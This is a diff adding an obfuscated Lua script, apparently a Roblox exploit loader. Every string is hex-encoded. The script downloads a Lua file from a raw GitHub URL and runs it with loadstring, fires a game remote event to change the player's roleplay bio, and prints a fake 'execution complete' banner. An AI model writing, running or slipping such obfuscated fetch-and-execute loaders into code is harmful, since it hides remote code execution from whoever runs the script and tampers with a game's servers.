@@ -1,0 +1,24 @@
+local _0xReda = function(s) local t = '' for i = 1, #s, 2 do t = t .. string.char(tonumber(s:sub(i, i + 1), 16)) end return t end
+
+local _0xLink = _0xReda("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F6E306B632F41746F6D69634875622F6D61696E2F4D61702D416C2D42696F75742E6C7561")
+
+local _0xService = {
+    ["P"] = game:GetService(_0xReda("506C6179657273")),
+    ["R"] = game:GetService(_0xReda("5265706C69636174656453746F72616765"))
+}
+
+local function _0xExecute()
+    pcall(function()
+        local _0xSource = game:HttpGet(_0xLink)
+        local _0xFinal = _0xSource:gsub(_0xReda("3132373137333735313237"), _0xReda("514C4F50"))
+        loadstring(_0xFinal)()
+
+        local _p = _0xService["P"].LocalPlayer
+        local _r = _0xService["R"]:WaitForChild(_0xReda("5245")):WaitForChild(_0xReda("3152504E616D31655465783174"))
+        local _b = { _0xReda("526F6C65506C617942696F"), _0xReda("57656C636F6D652020") .. _p.DisplayName }
+        _r:FireServer(unpack(_b))
+    end)
+end
+
+task.spawn(_0xExecute)
+print(_0xReda("53595354454D5F52454144593A20455845435554494F4E5F434F4D504C4554452E3F213F213F213F213F213F21"))
